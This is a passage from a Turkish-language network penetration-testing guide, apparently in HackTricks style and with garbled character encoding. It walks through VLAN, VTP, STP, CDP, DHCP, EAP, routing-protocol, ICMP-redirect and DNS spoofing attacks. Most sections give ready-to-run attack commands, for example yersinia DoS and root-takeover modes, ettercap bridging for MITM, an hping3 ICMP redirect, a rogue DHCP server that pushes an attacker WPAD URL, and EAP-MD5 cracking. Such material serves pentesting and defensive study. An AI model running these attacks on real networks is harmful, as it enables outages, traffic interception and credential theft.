SaldÄ±rÄ±, **hedef istemcinin IP adresini taÅŸÄ±yan ancak yÃ¶nlendiricinin MAC adresi ile birlikte olan bir paket oluÅŸturularak** gerÃ§ekleÅŸtirilir. Bu, yÃ¶nlendiricinin paketi yanlÄ±ÅŸlÄ±kla hedef istemciye iletmesine neden olur. Bu yaklaÅŸÄ±m, kurbanÄ±n eriÅŸebileceÄŸi bir ana bilgisayarÄ± kontrol etme yeteneÄŸinin gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± istismar etmek iÃ§in kullanÄ±ldÄ±ÄŸÄ± Double Tagging SaldÄ±rÄ±larÄ± ile benzerdir.

**SaldÄ±rÄ±nÄ±n Ana AdÄ±mlarÄ±:**

1. **Bir Paket OluÅŸturma:** Hedef istemcinin IP adresini iÃ§eren ancak yÃ¶nlendiricinin MAC adresi ile birlikte Ã¶zel olarak hazÄ±rlanmÄ±ÅŸ bir paket oluÅŸturulur.
2. **YÃ¶nlendirici DavranÄ±ÅŸÄ±nÄ± Ä°stismar Etme:** HazÄ±rlanan paket, yÃ¶nlendiriciye gÃ¶nderilir; yapÄ±landÄ±rma nedeniyle, paket hedef istemciye yÃ¶nlendirilir ve Ã¶zel VLAN ayarlarÄ± tarafÄ±ndan saÄŸlanan izolasyonu aÅŸar.

### VTP Attacks

VTP (VLAN Trunking Protocol) VLAN yÃ¶netimini merkezileÅŸtirir. VLAN veritabanÄ± bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ korumak iÃ§in revizyon numaralarÄ±nÄ± kullanÄ±r; herhangi bir deÄŸiÅŸiklik bu numarayÄ± artÄ±rÄ±r. Anahtarlar, kendi VLAN veritabanlarÄ±nÄ± gÃ¼ncelleyerek daha yÃ¼ksek revizyon numaralarÄ±na sahip yapÄ±landÄ±rmalarÄ± benimser.

#### VTP Domain Roles

* **VTP Sunucusu:** VLAN'larÄ± yÃ¶netirâ€”oluÅŸturur, siler, deÄŸiÅŸtirir. Alan Ã¼yelerine VTP duyurularÄ± yayÄ±nlar.
* **VTP Ä°stemcisi:** VLAN veritabanÄ±nÄ± senkronize etmek iÃ§in VTP duyurularÄ±nÄ± alÄ±r. Bu rol, yerel VLAN yapÄ±landÄ±rma deÄŸiÅŸikliklerinden kÄ±sÄ±tlanmÄ±ÅŸtÄ±r.
* **VTP Åeffaf:** VTP gÃ¼ncellemelerine katÄ±lmaz ancak VTP duyurularÄ±nÄ± iletir. VTP saldÄ±rÄ±larÄ±ndan etkilenmez, sÄ±fÄ±r olan sabit bir revizyon numarasÄ±nÄ± korur.

#### VTP Advertisement Types

* **Ã–zet Duyurusu:** VTP sunucusu tarafÄ±ndan her 300 saniyede bir yayÄ±nlanÄ±r ve temel alan bilgilerini taÅŸÄ±r.
* **Alt KÃ¼me Duyurusu:** VLAN yapÄ±landÄ±rma deÄŸiÅŸikliklerinden sonra gÃ¶nderilir.
* **Duyuru Talebi:** Daha yÃ¼ksek bir yapÄ±landÄ±rma revizyon numarasÄ±nÄ± tespit etmesi durumunda, bir VTP istemcisi tarafÄ±ndan Ã–zet Duyurusu talep etmek iÃ§in verilir.

VTP zafiyetleri yalnÄ±zca trunk portlarÄ± aracÄ±lÄ±ÄŸÄ±yla istismar edilebilir, Ã§Ã¼nkÃ¼ VTP duyurularÄ± yalnÄ±zca bunlar Ã¼zerinden dolaÅŸÄ±r. DTP saldÄ±rÄ±sÄ± sonrasÄ± senaryolar VTP'ye kayabilir. Yersinia gibi araÃ§lar, VLAN veritabanÄ±nÄ± silmeyi hedefleyerek VTP saldÄ±rÄ±larÄ±nÄ± kolaylaÅŸtÄ±rabilir ve aÄŸÄ± etkili bir ÅŸekilde kesintiye uÄŸratabilir.

Not: Bu tartÄ±ÅŸma VTP sÃ¼rÃ¼m 1 (VTPv1) ile ilgilidir.
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Yersinia'nÄ±n grafiksel modunda, VLAN veritabanÄ±nÄ± temizlemek iÃ§in tÃ¼m VTP VLAN'larÄ±nÄ± silme seÃ§eneÄŸini seÃ§in.

### STP SaldÄ±rÄ±larÄ±

**EÄŸer arayÃ¼zlerinizde BPDU Ã§erÃ§evelerini yakalayamÄ±yorsanÄ±z, STP saldÄ±rÄ±sÄ±nda baÅŸarÄ±lÄ± olmanÄ±z olasÄ± deÄŸildir.**

#### **STP BPDU DoS**

BirÃ§ok BPDU TCP (Topoloji DeÄŸiÅŸikliÄŸi Bildirimi) veya Conf (topoloji oluÅŸturulduÄŸunda gÃ¶nderilen BPDU'lar) gÃ¶ndererek, anahtarlar aÅŸÄ±rÄ± yÃ¼klenir ve doÄŸru Ã§alÄ±ÅŸmayÄ± durdurur.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP SaldÄ±rÄ±sÄ±**

Bir TCP gÃ¶nderildiÄŸinde, anahtarlarÄ±n CAM tablosu 15 saniyede silinecektir. ArdÄ±ndan, bu tÃ¼r paketleri sÃ¼rekli gÃ¶nderiyorsanÄ±z, CAM tablosu sÃ¼rekli (veya her 15 saniyede bir) yeniden baÅŸlatÄ±lacak ve yeniden baÅŸlatÄ±ldÄ±ÄŸÄ±nda, anahtar bir hub gibi davranacaktÄ±r.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

SaldÄ±rgan, bir anahtarÄ±n davranÄ±ÅŸÄ±nÄ± simÃ¼le ederek aÄŸÄ±n STP kÃ¶kÃ¼ haline gelir. ArdÄ±ndan, daha fazla veri onun Ã¼zerinden geÃ§ecektir. Bu, iki farklÄ± anahtara baÄŸlÄ± olduÄŸunuzda ilginÃ§tir.\
Bu, **Ã¶ncelik** deÄŸerinin gerÃ§ek kÃ¶k anahtarÄ±n gerÃ§ek Ã¶nceliÄŸinden daha az olduÄŸunu sÃ¶yleyen BPDUs CONF paketleri gÃ¶ndererek yapÄ±lÄ±r.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**EÄŸer saldÄ±rgan 2 anahtara baÄŸlÄ±ysa, yeni aÄŸacÄ±n kÃ¶kÃ¼ olabilir ve bu anahtarlar arasÄ±ndaki tÃ¼m trafik onun Ã¼zerinden geÃ§ecektir** (bir MITM saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirilecektir).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP SaldÄ±rÄ±larÄ±

CISCO Discovery Protocol (CDP), CISCO cihazlarÄ± arasÄ±nda iletiÅŸim iÃ§in gereklidir ve onlarÄ±n **birbirlerini tanÄ±mlayÄ±p yapÄ±landÄ±rma detaylarÄ±nÄ± paylaÅŸmalarÄ±nÄ±** saÄŸlar.

#### Pasif Veri Toplama <a href="#id-0e0f" id="id-0e0f"></a>

CDP, bilgileri tÃ¼m portlar Ã¼zerinden yayÄ±nlayacak ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r, bu da bir gÃ¼venlik riski oluÅŸturabilir. Bir saldÄ±rgan, bir anahtar portuna baÄŸlandÄ±ÄŸÄ±nda, **Wireshark**, **tcpdump** veya **Yersinia** gibi aÄŸ dinleyicileri kullanabilir. Bu eylem, aÄŸ cihazÄ± hakkÄ±nda model ve Ã§alÄ±ÅŸtÄ±ÄŸÄ± Cisco IOS sÃ¼rÃ¼mÃ¼ gibi hassas verileri aÃ§Ä±ÄŸa Ã§Ä±karabilir. SaldÄ±rgan, ardÄ±ndan belirlenen Cisco IOS sÃ¼rÃ¼mÃ¼ndeki belirli zafiyetleri hedef alabilir.

#### CDP Tablosu TaÅŸmasÄ± SaÄŸlama <a href="#id-0d6a" id="id-0d6a"></a>

Daha agresif bir yaklaÅŸÄ±m, anahtarÄ±n belleÄŸini aÅŸÄ±rÄ± yÃ¼kleyerek bir Hizmet Reddi (DoS) saldÄ±rÄ±sÄ± baÅŸlatmaktÄ±r; bu, meÅŸru CISCO cihazlarÄ± gibi davranarak yapÄ±lÄ±r. AÅŸaÄŸÄ±da, Yersinia kullanarak bÃ¶yle bir saldÄ±rÄ±yÄ± baÅŸlatmak iÃ§in gereken komut dizisi bulunmaktadÄ±r:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Bu saldÄ±rÄ± sÄ±rasÄ±nda, anahtarÄ±n CPU'su ve CDP komÅŸu tablosu aÄŸÄ±r bir ÅŸekilde yÃ¼klenir, bu da genellikle aÅŸÄ±rÄ± kaynak tÃ¼ketimi nedeniyle **â€œaÄŸ felciâ€** olarak adlandÄ±rÄ±lÄ±r.

#### CDP Taklit SaldÄ±rÄ±sÄ±
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP SaldÄ±rÄ±larÄ± ve VoIP Hopper AracÄ±

VoIP telefonlarÄ±, giderek IoT cihazlarÄ±yla entegre hale gelerek, kapÄ±larÄ± aÃ§ma veya termostatlarÄ± kontrol etme gibi iÅŸlevler sunar. Ancak, bu entegrasyon gÃ¼venlik riskleri oluÅŸturabilir.

AracÄ± [**voiphopper**](http://voiphopper.sourceforge.net), Ã§eÅŸitli ortamlarda (Cisco, Avaya, Nortel, Alcatel-Lucent) bir VoIP telefonunu taklit etmek iÃ§in tasarlanmÄ±ÅŸtÄ±r. Ses aÄŸÄ±nÄ±n VLAN kimliÄŸini CDP, DHCP, LLDP-MED ve 802.1Q ARP gibi protokoller kullanarak keÅŸfeder.

**VoIP Hopper**, Cisco Discovery Protocol (CDP) iÃ§in Ã¼Ã§ mod sunar:

1. **Sniff Modu** (`-c 0`): VLAN kimliÄŸini belirlemek iÃ§in aÄŸ paketlerini analiz eder.
2. **Spoof Modu** (`-c 1`): GerÃ§ek bir VoIP cihazÄ±nÄ±n paketlerini taklit eden Ã¶zel paketler oluÅŸturur.
3. **Ã–nceden YapÄ±lmÄ±ÅŸ Paket ile Spoof Modu** (`-c 2`): Belirli bir Cisco IP telefon modeliyle aynÄ± olan paketleri gÃ¶nderir.

HÄ±z iÃ§in tercih edilen mod Ã¼Ã§Ã¼ncÃ¼sÃ¼dÃ¼r. ÅunlarÄ± belirtmek gerekir:

* SaldÄ±rganÄ±n aÄŸ arayÃ¼zÃ¼ (`-i` parametresi).
* Taklit edilen VoIP cihazÄ±nÄ±n adÄ± (`-E` parametresi), Cisco adlandÄ±rma formatÄ±na (Ã¶rneÄŸin, SEP ardÄ±ndan bir MAC adresi) uygun olmalÄ±dÄ±r.

Kurumsal ortamlarda, mevcut bir VoIP cihazÄ±nÄ± taklit etmek iÃ§in ÅŸunlar yapÄ±labilir:

* Telefonda MAC etiketini incelemek.
* Telefonun ekran ayarlarÄ±na giderek model bilgilerini gÃ¶rÃ¼ntÃ¼lemek.
* VoIP cihazÄ±nÄ± bir dizÃ¼stÃ¼ bilgisayara baÄŸlayarak Wireshark kullanarak CDP isteklerini gÃ¶zlemlemek.

ÃœÃ§Ã¼ncÃ¼ modda aracÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in bir Ã¶rnek komut:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP SaldÄ±rÄ±larÄ±

#### SayÄ±m
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS'un iki tÃ¼rÃ¼** DHCP sunucularÄ±na karÅŸÄ± gerÃ§ekleÅŸtirilebilir. Ä°lk tÃ¼r, **tÃ¼m olasÄ± IP adreslerini kullanmak iÃ§in yeterince sahte ana bilgisayar simÃ¼le etmekten** oluÅŸur.\
Bu saldÄ±rÄ±, DHCP sunucusunun yanÄ±tlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z ve protokolÃ¼ tamamlayabiliyorsanÄ±z (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)) Ã§alÄ±ÅŸacaktÄ±r. Ã–rneÄŸin, bu **Wifi aÄŸlarÄ±nda mÃ¼mkÃ¼n deÄŸildir**.

DHCP DoS gerÃ§ekleÅŸtirmek iÃ§in baÅŸka bir yol, **her olasÄ± IP'yi kaynak kodu olarak kullanarak bir DHCP-RELEASE paketi gÃ¶ndermektir**. BÃ¶ylece, sunucu herkesin IP'yi kullanmayÄ± bitirdiÄŸini dÃ¼ÅŸÃ¼necektir.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Daha otomatik bir yol, [DHCPing](https://github.com/kamorin/DHCPig) aracÄ±nÄ± kullanmaktÄ±r.

Belirtilen DoS saldÄ±rÄ±larÄ±nÄ± kullanarak, istemcileri ortam iÃ§inde yeni kiralamalar almaya zorlayabilir ve meÅŸru sunucularÄ± tÃ¼keterek yanÄ±t veremez hale getirebilirsiniz. BÃ¶ylece meÅŸru sunucular yeniden baÄŸlanmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda, **bir sonraki saldÄ±rÄ±da belirtilen kÃ¶tÃ¼ niyetli deÄŸerleri sunabilirsiniz**.

#### KÃ¶tÃ¼ niyetli deÄŸerleri ayarlama

Bir sahte DHCP sunucusu, `/usr/share/responder/DHCP.py` konumundaki DHCP betiÄŸi kullanÄ±larak kurulabilir. Bu, trafiÄŸi kÃ¶tÃ¼ niyetli bir sunucuya yÃ¶nlendirerek HTTP trafiÄŸini ve kimlik bilgilerini yakalamak gibi aÄŸ saldÄ±rÄ±larÄ± iÃ§in faydalÄ±dÄ±r. Ancak, sahte bir aÄŸ geÃ§idi ayarlamak daha az etkilidir Ã§Ã¼nkÃ¼ yalnÄ±zca istemciden Ã§Ä±kan trafiÄŸi yakalamaya izin verir ve gerÃ§ek aÄŸ geÃ§idinden gelen yanÄ±tlarÄ± kaÃ§Ä±rÄ±r. Bunun yerine, daha etkili bir saldÄ±rÄ± iÃ§in sahte bir DNS veya WPAD sunucusu kurmak Ã¶nerilir.

AÅŸaÄŸÄ±da sahte DHCP sunucusunu yapÄ±landÄ±rmak iÃ§in komut seÃ§enekleri bulunmaktadÄ±r:

* **IP Adresimiz (AÄŸ GeÃ§idi Ä°lanÄ±)**: Makinenizin IP'sini aÄŸ geÃ§idi olarak ilan etmek iÃ§in `-i 10.0.0.100` kullanÄ±n.
* **Yerel DNS Alan AdÄ±**: Ä°steÄŸe baÄŸlÄ± olarak, yerel bir DNS alan adÄ± ayarlamak iÃ§in `-d example.org` kullanÄ±n.
* **Orijinal YÃ¶nlendirici/AÄŸ GeÃ§idi IP'si**: MeÅŸru yÃ¶nlendiricinin veya aÄŸ geÃ§idinin IP adresini belirtmek iÃ§in `-r 10.0.0.1` kullanÄ±n.
* **Birincil DNS Sunucusu IP'si**: Kontrol ettiÄŸiniz sahte DNS sunucusunun IP adresini ayarlamak iÃ§in `-p 10.0.0.100` kullanÄ±n.
* **Ä°kincil DNS Sunucusu IP'si**: Ä°steÄŸe baÄŸlÄ± olarak, ikincil bir DNS sunucusu IP'si ayarlamak iÃ§in `-s 10.0.0.1` kullanÄ±n.
* **Yerel AÄŸÄ±n Alt AÄŸ Maskesi**: Yerel aÄŸ iÃ§in alt aÄŸ maskesini tanÄ±mlamak iÃ§in `-n 255.255.255.0` kullanÄ±n.
* **DHCP TrafiÄŸi iÃ§in ArayÃ¼z**: Belirli bir aÄŸ arayÃ¼zÃ¼nde DHCP trafiÄŸini dinlemek iÃ§in `-I eth1` kullanÄ±n.
* **WPAD YapÄ±landÄ±rma Adresi**: Web trafiÄŸi kesintisi iÃ§in WPAD yapÄ±landÄ±rma adresini ayarlamak iÃ§in `-w â€œhttp://10.0.0.100/wpad.datâ€` kullanÄ±n.
* **VarsayÄ±lan AÄŸ GeÃ§idi IP'sini Taklit Etme**: VarsayÄ±lan aÄŸ geÃ§idi IP adresini taklit etmek iÃ§in `-S` ekleyin.
* **TÃ¼m DHCP Ä°steklerine YanÄ±t Verme**: Sunucunun tÃ¼m DHCP isteklerine yanÄ±t vermesi iÃ§in `-R` ekleyin, ancak bunun gÃ¼rÃ¼ltÃ¼lÃ¼ olduÄŸunu ve tespit edilebileceÄŸini unutmayÄ±n.

Bu seÃ§enekleri doÄŸru bir ÅŸekilde kullanarak, aÄŸ trafiÄŸini etkili bir ÅŸekilde kesmek iÃ§in bir sahte DHCP sunucusu kurulabilir.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP SaldÄ±rÄ±larÄ±**

Ä°ÅŸte 802.1X uygulamalarÄ±na karÅŸÄ± kullanÄ±labilecek bazÄ± saldÄ±rÄ± taktikleri:

* EAP Ã¼zerinden aktif brute-force ÅŸifre kÄ±rma
* BozulmuÅŸ EAP iÃ§eriÄŸi ile RADIUS sunucusuna saldÄ±rma _\*\*_(istismarlar)
* EAP mesajlarÄ±nÄ± yakalama ve Ã§evrimdÄ±ÅŸÄ± ÅŸifre kÄ±rma (EAP-MD5 ve PEAP)
* TLS sertifika doÄŸrulamasÄ±nÄ± atlamak iÃ§in EAP-MD5 kimlik doÄŸrulamasÄ±nÄ± zorlamak
* Bir hub veya benzeri bir cihaz kullanarak kimlik doÄŸrulama sÄ±rasÄ±nda kÃ¶tÃ¼ niyetli aÄŸ trafiÄŸi enjekte etme

EÄŸer saldÄ±rgan, kurban ile kimlik doÄŸrulama sunucusu arasÄ±nda ise, kimlik doÄŸrulama protokolÃ¼nÃ¼ EAP-MD5'ye dÃ¼ÅŸÃ¼rmeyi (gerekirse) deneyebilir ve kimlik doÄŸrulama giriÅŸimini yakalayabilir. ArdÄ±ndan, bunu brute-force ile kÄ±rmayÄ± deneyebilir:
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) SaldÄ±rÄ±larÄ± <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol), **bir sÄ±cak yedek yÃ¶nlendirme sistemi oluÅŸturmak** iÃ§in tasarlanmÄ±ÅŸ bir aÄŸ protokolleri sÄ±nÄ±fÄ±dÄ±r. FHRP ile fiziksel yÃ¶nlendiriciler tek bir mantÄ±ksal cihazda birleÅŸtirilebilir, bu da hata toleransÄ±nÄ± artÄ±rÄ±r ve yÃ¼k daÄŸÄ±lÄ±mÄ±na yardÄ±mcÄ± olur.

**Cisco Systems mÃ¼hendisleri iki FHRP protokolÃ¼ geliÅŸtirmiÅŸtir: GLBP ve HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

YÃ¶nlendirme Bilgisi ProtokolÃ¼ (RIP) olarak bilinen Ã¼Ã§ versiyon vardÄ±r: RIP, RIPv2 ve RIPng. RIP ve RIPv2, datagramlarÄ± UDP Ã¼zerinden 520 numaralÄ± port aracÄ±lÄ±ÄŸÄ±yla akranlara gÃ¶nderirken, RIPng datagramlarÄ± IPv6 Ã§oklu yayÄ±nÄ± aracÄ±lÄ±ÄŸÄ±yla UDP 521 numaralÄ± portuna yayÄ±nlar. MD5 kimlik doÄŸrulama desteÄŸi RIPv2 ile tanÄ±tÄ±lmÄ±ÅŸtÄ±r. Ã–te yandan, RIPng yerel kimlik doÄŸrulama iÃ§ermemektedir; bunun yerine, IPv6 iÃ§indeki isteÄŸe baÄŸlÄ± IPsec AH ve ESP baÅŸlÄ±klarÄ±na gÃ¼venilmektedir.

* **RIP ve RIPv2:** Ä°letiÅŸim, 520 numaralÄ± portta UDP datagramlarÄ± aracÄ±lÄ±ÄŸÄ±yla yapÄ±lÄ±r.
* **RIPng:** IPv6 Ã§oklu yayÄ±nÄ± aracÄ±lÄ±ÄŸÄ±yla datagramlarÄ± yayÄ±nlamak iÃ§in 521 numaralÄ± UDP portunu kullanÄ±r.

RIPv2'nin MD5 kimlik doÄŸrulamasÄ±nÄ± desteklediÄŸini, RIPng'nin ise yerel kimlik doÄŸrulama iÃ§ermediÄŸini ve IPv6'daki IPsec AH ve ESP baÅŸlÄ±klarÄ±na gÃ¼vendiÄŸini unutmayÄ±n.

### EIGRP SaldÄ±rÄ±larÄ±

**EIGRP (Enhanced Interior Gateway Routing Protocol)**, dinamik bir yÃ¶nlendirme protokolÃ¼dÃ¼r. **Bu bir mesafe-vektÃ¶r protokolÃ¼dÃ¼r.** EÄŸer **kimlik doÄŸrulama** yoksa ve pasif arayÃ¼zlerin yapÄ±landÄ±rmasÄ± yapÄ±lmamÄ±ÅŸsa, bir **saldÄ±rgan** EIGRP yÃ¶nlendirmesine mÃ¼dahale edebilir ve **yÃ¶nlendirme tablolarÄ±nÄ± zehirleyebilir**. AyrÄ±ca, EIGRP aÄŸÄ± (diÄŸer bir deyiÅŸle, otonom sistem) **dÃ¼zdÃ¼r ve herhangi bir bÃ¶lgeye ayrÄ±lmamÄ±ÅŸtÄ±r**. EÄŸer bir **saldÄ±rgan bir rota enjekte ederse**, bu rotanÄ±n otonom EIGRP sistemi boyunca **yayÄ±lmasÄ±** muhtemeldir.

EIGRP sistemine saldÄ±rmak, **meÅŸru bir EIGRP yÃ¶nlendiricisi ile bir komÅŸuluk kurmayÄ±** gerektirir; bu da temel keÅŸiften Ã§eÅŸitli enjekte etmelere kadar birÃ§ok olasÄ±lÄ±ÄŸÄ± aÃ§ar.

[**FRRouting**](https://frrouting.org/) **BGP, OSPF, EIGRP, RIP ve diÄŸer protokolleri destekleyen sanal bir yÃ¶nlendirici uygulamanÄ±za** olanak tanÄ±r. Tek yapmanÄ±z gereken, bunu saldÄ±rganÄ±n sistemine daÄŸÄ±tmak ve aslÄ±nda yÃ¶nlendirme alanÄ±nda meÅŸru bir yÃ¶nlendirici gibi davranmaktÄ±r.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) EIGRP (Enhanced Interior Gateway Routing Protocol) yayÄ±nlarÄ±nÄ± yakalama yeteneklerine sahiptir. AyrÄ±ca, yÃ¶nlendirme yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirmek iÃ§in kullanÄ±labilecek paketlerin enjekte edilmesine de olanak tanÄ±r.

### OSPF

Open Shortest Path First (OSPF) protokolÃ¼nde **MD5 kimlik doÄŸrulamasÄ±, yÃ¶nlendiriciler arasÄ±nda gÃ¼venli iletiÅŸimi saÄŸlamak iÃ§in yaygÄ±n olarak kullanÄ±lÄ±r**. Ancak, bu gÃ¼venlik Ã¶nlemi Loki ve John the Ripper gibi araÃ§lar kullanÄ±larak tehlikeye atÄ±labilir. Bu araÃ§lar, MD5 hash'lerini yakalayabilir ve kÄ±rabilir, bÃ¶ylece kimlik doÄŸrulama anahtarÄ±nÄ± aÃ§Ä±ÄŸa Ã§Ä±karabilir. Bu anahtar elde edildikten sonra, yeni yÃ¶nlendirme bilgileri eklemek iÃ§in kullanÄ±labilir. Rota parametrelerini yapÄ±landÄ±rmak ve ele geÃ§irilmiÅŸ anahtarÄ± belirlemek iÃ§in sÄ±rasÄ±yla _Injection_ ve _Connection_ sekmeleri kullanÄ±lÄ±r.

* **MD5 Hash'lerini Yakalama ve KÄ±rma:** Bu amaÃ§la Loki ve John the Ripper gibi araÃ§lar kullanÄ±lÄ±r.
* **Rota Parametrelerini YapÄ±landÄ±rma:** Bu, _Injection_ sekmesi aracÄ±lÄ±ÄŸÄ±yla yapÄ±lÄ±r.
* **Ele GeÃ§irilmiÅŸ AnahtarÄ± Ayarlama:** Anahtar, _Connection_ sekmesi altÄ±nda yapÄ±landÄ±rÄ±lÄ±r.

### DiÄŸer Genel AraÃ§lar ve Kaynaklar

* [**Above**](https://github.com/c4s73r/Above): AÄŸ trafiÄŸini taramak ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulmak iÃ§in bir araÃ§
* AÄŸ saldÄ±rÄ±larÄ± hakkÄ±nda **daha fazla bilgi** [**burada**](https://github.com/Sab0tag3d/MITM-cheatsheet) bulabilirsiniz.

## **Sahtecilik**

SaldÄ±rgan, sahte DHCP yanÄ±tlarÄ± gÃ¶ndererek aÄŸÄ±n yeni Ã¼yesinin tÃ¼m aÄŸ parametrelerini (GW, IP, DNS) yapÄ±landÄ±rÄ±r.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

[Ã–nceki bÃ¶lÃ¼mÃ¼ kontrol edin](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect, saldÄ±rganÄ±n bir IP'ye ulaÅŸmanÄ±n en iyi yolu olduÄŸunu belirten bir ICMP paket tÃ¼rÃ¼ 1 kod 5 gÃ¶ndermeyi iÃ§erir. ArdÄ±ndan, kurban IP ile iletiÅŸim kurmak istediÄŸinde, paketi saldÄ±rgan Ã¼zerinden gÃ¶nderecektir.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

SaldÄ±rgan, kurbanÄ±n talep ettiÄŸi bazÄ± (veya tÃ¼m) alan adlarÄ±nÄ± Ã§Ã¶zecektir.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq ile kendi DNS'inizi yapÄ±landÄ±rÄ±n**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Yerel AÄŸ GeÃ§itleri

Sistemlere ve aÄŸlara genellikle birden fazla yol vardÄ±r. Yerel aÄŸ iÃ§indeki MAC adreslerinin bir listesini oluÅŸturduktan sonra, IPv4 yÃ¶nlendirmesini destekleyen ana bilgisayarlarÄ± tanÄ±mlamak iÃ§in _gateway-finder.py_ kullanÄ±n.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR, NBT-NS ve mDNS Spoofing](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS sorgularÄ± baÅŸarÄ±sÄ±z olduÄŸunda yerel ana bilgisayar Ã§Ã¶zÃ¼mÃ¼ iÃ§in Microsoft sistemleri **Link-Local Multicast Name Resolution (LLMNR)** ve **NetBIOS Name Service (NBT-NS)**'ye dayanÄ±r. Benzer ÅŸekilde, **Apple Bonjour** ve **Linux sÄ±fÄ±r yapÄ±landÄ±rma** uygulamalarÄ±, bir aÄŸ iÃ§indeki sistemleri keÅŸfetmek iÃ§in **Multicast DNS (mDNS)** kullanÄ±r. Bu protokollerin kimlik doÄŸrulama gerektirmeyen doÄŸasÄ± ve UDP Ã¼zerinden Ã§alÄ±ÅŸmalarÄ±, mesajlarÄ± yayÄ±nlayarak, kullanÄ±cÄ±larÄ± kÃ¶tÃ¼ niyetli hizmetlere yÃ¶nlendirmeyi amaÃ§layan saldÄ±rganlar tarafÄ±ndan istismar edilebilir.

YanÄ±tlayÄ±cÄ±yÄ± kullanarak ana bilgisayarlar tarafÄ±ndan aranan hizmetleri taklit etmek iÃ§in sahte yanÄ±tlar gÃ¶nderebilirsiniz.\
Daha fazla bilgi iÃ§in [YanÄ±tlayÄ±cÄ± ile hizmetleri nasÄ±l taklit edeceÄŸinizi buradan okuyun](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [WPAD Spoofing](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

